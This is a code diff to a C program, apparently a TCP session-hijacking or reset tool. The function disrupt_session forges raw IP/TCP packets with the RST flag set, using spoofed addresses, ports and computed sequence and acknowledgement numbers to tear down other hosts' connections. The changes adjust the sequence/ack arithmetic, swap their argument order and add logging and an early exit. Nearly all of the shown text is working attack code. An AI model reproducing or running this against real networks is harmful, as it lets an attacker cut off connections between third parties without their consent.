@@ -103,12 +103,13 @@ void display_usage(char *name) {
  */
 void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, uint16_t destinationPort, uint32_t sequenceNumber, uint32_t ackNumber) {
     static bool checked = false;
-    static uint32_t prevSeq = 0;
-    static uint32_t prevAck = 0;
+//    static uint32_t prevSeq = 0;
+//    static uint32_t prevAck = 0;
     static char packet[ sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 ];
     
     // Socket FD
     int sock, one = 1;
+    int secondTime = 0;
 
     // Amounts to increase ack and seq by
     uint32_t ack_inc, seq_inc;
@@ -119,26 +120,28 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
     // Initialize static values if they have never been set
     if(!checked) {
         checked = true;
-        prevSeq = sequenceNumber;
-        prevAck = ackNumber;
+//        prevSeq = sequenceNumber;
+//        prevAck = ackNumber;
         ack_inc = 1;
+        seq_inc = 1;
     } else {
-        ack_inc = ackNumber - prevAck;
-        seq_inc = sequenceNumber - prevSeq;
+        ack_inc = 1;
+        seq_inc = 0;
+        secondTime = 1;
     }
 
-    printf("New Sequence Number: %u", sequenceNumber + seq_inc);
-    printf("New ACK: %u", ackNumber + ack_inc);
+    printf("[disrupt_session]: New Sequence Number: %u\n", sequenceNumber + seq_inc);
+    printf("[disrupt_session]: New ACK: %u\n\n", ackNumber + ack_inc);
 
     //Raw socket without any protocol-header inside
     if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-        perror("Error while creating socket");
+        perror("Error while creating socket\n");
         exit(-1);
     }
 
     //Set option IP_HDRINCL (headers are included in packet)
     if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
-        perror("Error while setting socket options");
+        perror("Error while setting socket options\n");
         exit(-1);
     }
 
@@ -153,13 +156,18 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
                 destinationPort,
                 0,
                 0,
-                sequenceNumber + seq_inc,
                 ackNumber + ack_inc,
+                sequenceNumber + seq_inc,
                 RESET_ON,
-                "\0",
+                "",
                 packet,
                 sizeof(struct tcphdr) + sizeof(struct iphdr) + 2);
 
     // Send out the packet
     send_packet(sock, packet, addr_in);
+
+    if(secondTime){
+        exit(0);
+    }
+
 }
